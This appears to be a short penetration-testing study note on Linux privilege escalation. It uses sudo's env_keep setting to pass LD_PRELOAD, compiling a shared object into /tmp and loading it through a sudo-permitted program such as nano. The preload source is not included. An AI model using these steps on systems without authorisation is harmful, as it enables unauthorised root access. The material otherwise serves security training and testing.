# LD_PRELOAD
***

- You can configure sudo to inherit specific environment variables from the user's environment. To determine which environment variables are inherited, examine the **env_keep** options.
```sh
sudo -l
```
![alt text](https://github.com/masjadaan/Knowledgebase/blob/main/Penetration_Testing/Exploitation/Linux/Privilege_Escalation/env_varialbes/aa4ae5b60d60446a8f0e5bc217973fec.png)

- **LD_PRELOAD** is an environment variable that, when set, loads a shared object before any others when a program is executed. You can create a shared object from code contained in a file named preload.c
```sh
gcc -fPIC -shared -nostartfiles /path/to/preload.c -o /tmp/preload.so
```

- Set the LD_PRELOAD environment variable to the full path of the newly created shared object.
```sh
sudo LD_PRELOAD=/tmp/preload.so nano
```

- Execute one of the programs that you have permission to run with sudo
